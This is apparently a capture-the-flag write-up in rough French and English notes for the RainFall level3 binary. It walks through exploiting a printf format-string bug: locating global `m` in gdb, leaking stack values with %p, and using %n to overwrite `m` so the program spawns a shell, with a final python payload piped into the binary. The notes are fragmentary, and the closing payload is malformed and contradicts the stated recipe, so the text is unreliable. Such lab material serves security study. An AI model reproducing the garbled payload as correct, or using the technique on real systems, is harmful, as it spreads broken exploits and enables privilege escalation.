observation:
- fgets
- m et shell
- printf (argument = )
vulnerabilite:
- printf mal utilise





Using a disassembler we see that `fgets` is used so we can't exploit it to do a buffer overflow, but `printf` is used with only our buffer as argument.
When printf only receive a format string it will use address on the stack, so we could print value from the stack (%p, %x etc...) but also write on it (%n).
Format string allow us to choose which argument to use with our option so we could also use a choosen address on the stack after calculating an offset. 
We also see that a global variable `m` is compared with 64 and in case of equality open a shell.
So using printf vulnerability we will try to overwrite m value to enter te condition that open a shell.

Using gdb we can see m address when its content is stored in eax and compared with 64.

```Shell
(gdb) disas v
[...]
 0x080484da <+54>:    mov    0x804988c,%eax
 0x080484df <+59>:    cmp    $0x40,%eax
[...]

 ```

Using this format string `AAAA %p %p %p %p` we will print the content of the four stack address that printf will use as argument and observe that the fourth is our buffer, because it's content is fill of 0x41 which is 'A' value in ASCII, the first four character of our buffer.

```Shell
level3@RainFall:~$ ./level3
AAAA %p %p %p %p
AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141

```

72 * A [addr]%n 1*A [addr + 4]%n

int a;
printf("123%n", &a)


1. offset

2. buffer = addresse + valeur + %offset$n

3. %n

4. format string


python -c 'print("A" * 64 + "%\x8c\x98\x04\x08$n")' > /tmp/input3

cat /tmp/input3 - | ./level3